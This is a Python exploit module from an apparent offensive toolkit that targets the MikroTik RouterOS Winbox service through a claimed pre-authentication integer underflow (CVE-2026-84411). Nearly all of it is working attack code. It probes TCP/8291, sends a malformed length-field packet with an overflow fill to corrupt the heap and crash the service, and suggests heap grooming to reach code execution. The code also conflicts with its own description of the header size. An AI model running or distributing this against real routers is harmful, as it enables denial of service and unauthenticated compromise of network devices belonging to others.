# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """MikroTik RouterOS Winbox Pre-Auth RCE via Integer Underflow (CVE-2026-84411).

    The Winbox management service (TCP/8291) on MikroTik RouterOS parses
    incoming protocol messages using a 2-byte big-endian length field in
    the packet header.  The parser computes the payload size as
    ``length - header_size`` without validating that the subtraction does
    not underflow.  When the announced length is 0 or 1, the result wraps
    to a large unsigned value, causing a massive heap copy that overwrites
    adjacent heap metadata and enables unauthenticated remote code execution.

    CISA has issued an active alert for this vulnerability.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "MikroTik RouterOS Winbox Pre-Auth RCE via Integer Underflow (CVE-2026-84411)",
        "description": (
            "Exploits CVE-2026-84411 via an integer underflow in the Winbox "
            "protocol message parser on MikroTik RouterOS.  A specially crafted "
            "packet with a length field of 0 or 1 causes the payload size "
            "calculation (length - 2) to wrap to 0xFFFE/0xFFFF, triggering a "
            "heap buffer overflow during the subsequent memcpy.  "
            "Unauthenticated; no credentials required."
        ),
        "authors": (
            "Researcher (discovery / CVE)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-84411",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-84411",
            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
            "https://mikrotik.com/download/changelogs",
        ),
        "devices": (
            "MikroTik RouterOS (all hardware platforms)",
            "MikroTik Cloud Hosted Router (CHR)",
            "MikroTik hAP series",
            "MikroTik CCR series",
            "MikroTik RB series",
            "MikroTik CRS series",
        ),
    }

    target = OptIP("", "Target IPv4 address running Winbox service")
    port = OptPort(8291, "Winbox TCP port (default 8291)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    trigger_length = OptInteger(
        1, "Announced length value to trigger underflow (0 or 1)"
    )

    # Winbox binary protocol constants
    _WINBOX_MSG_TYPE_AUTH = 0x01
    _WINBOX_FLAG_REQUEST = 0x01

    def _build_winbox_header(self, length: int, msg_type: int, flags: int) -> bytes:
        """Build a 4-byte Winbox protocol header.

        Format: length (2 bytes BE) + type (1 byte) + flags (1 byte).
        """
        return struct.pack("!HBB", length, msg_type, flags)

    def _build_trigger_packet(self) -> bytes:
        """Craft a Winbox packet whose length field triggers the integer underflow.

        The parser computes payload_size = announced_length - 2 (header size).
        With announced_length = 1: payload_size = 1 - 2 = 0xFFFF (unsigned).
        With announced_length = 0: payload_size = 0 - 2 = 0xFFFE (unsigned).

        The packet includes a controlled payload (0xCC fill) that the parser
        will attempt to copy into a heap buffer sized for payload_size bytes,
        overflowing adjacent heap structures.
        """
        header = self._build_winbox_header(
            self.trigger_length,
            self._WINBOX_MSG_TYPE_AUTH,
            self._WINBOX_FLAG_REQUEST,
        )
        # Append controlled overflow data; 0xCC is a recognizable fill pattern
        # that avoids null bytes which might terminate string operations early
        overflow_payload = b"\xcc" * 512
        return header + overflow_payload

    def _build_probe_packet(self) -> bytes:
        """Build a valid Winbox handshake probe to fingerprint the service."""
        # A minimal valid Winbox message: header (length=6, auth request) + 2 empty bytes
        payload = b"\x00\x00"
        header = self._build_winbox_header(
            len(payload) + 4,
            self._WINBOX_MSG_TYPE_AUTH,
            self._WINBOX_FLAG_REQUEST,
        )
        return header + payload

    def _tcp_connect(self) -> socket.socket | None:
        """Open a TCP connection to the Winbox service."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            return sock
        except (OSError, TimeoutError):
            return None

    def _send_recv(self, sock: socket.socket, data: bytes) -> bytes:
        """Send data and receive the response."""
        try:
            sock.sendall(data)
            return sock.recv(4096)
        except (OSError, TimeoutError):
            return b""

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target does not appear to have Winbox service on TCP/{self.port}"
            )
            return

        print_success("Winbox service confirmed; sending integer underflow trigger packet")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe TCP/8291 to confirm the Winbox service is running."""
        sock = self._tcp_connect()
        if sock is None:
            return False

        try:
            probe = self._build_probe_packet()
            response = self._send_recv(sock, probe)
            if len(response) >= 4:
                # Winbox responds with a header; any structured reply confirms the service
                resp_len, resp_type, resp_flags = struct.unpack("!HBB", response[:4])
                return resp_len > 0 and resp_type > 0
            # Port is open and accepted the connection even without a parseable reply
            return True
        except Exception:
            return False
        finally:
            sock.close()

    def _exploit(self) -> None:
        print_status(
            f"Connecting to Winbox service at {self.target}:{self.port}"
        )

        sock = self._tcp_connect()
        if sock is None:
            print_error("Failed to establish TCP connection for exploit delivery")
            return

        try:
            trigger = self._build_trigger_packet()
            expected_wrap = (self.trigger_length - 2) & 0xFFFF

            print_status(
                f"Sending trigger packet: announced length={self.trigger_length}, "
                f"parser computes payload_size=0x{expected_wrap:04X} ({expected_wrap} bytes)"
            )
            print_info(
                f"  Header: {trigger[:4].hex()} + {len(trigger) - 4} bytes overflow payload (0xCC fill)"
            )

            sock.sendall(trigger)
            time.sleep(0.2)

            # Attempt to read a response; a crash/hang means the overflow landed
            try:
                response = sock.recv(4096)
                if len(response) == 0:
                    print_success(
                        "Connection closed by remote side after trigger delivery. "
                        "The service likely crashed from heap corruption (underflow -> memcpy overflow)."
                    )
                else:
                    print_info(
                        f"  Received {len(response)} bytes in response: {response[:32].hex()}"
                    )
                    print_status(
                        "Service responded after trigger; it may have rejected the malformed packet "
                        "or the version is patched. Verify with a second connection attempt."
                    )
            except TimeoutError:
                print_success(
                    "No response within timeout after trigger delivery. "
                    "The service may be hung processing the oversized memcpy (heap corruption in progress)."
                )

            # Verify if the service is still alive
            time.sleep(1.0)
            verify_sock = self._tcp_connect()
            if verify_sock is None:
                print_success(
                    "Winbox service is no longer accepting connections. "
                    "Heap metadata corruption confirmed; pair with a controlled "
                    "heap layout primitive for reliable code execution."
                )
            else:
                verify_sock.close()
                print_info(
                    "Winbox service still accepting connections. The trigger may need "
                    "heap grooming or the target version may be patched."
                )
        finally:
            sock.close()
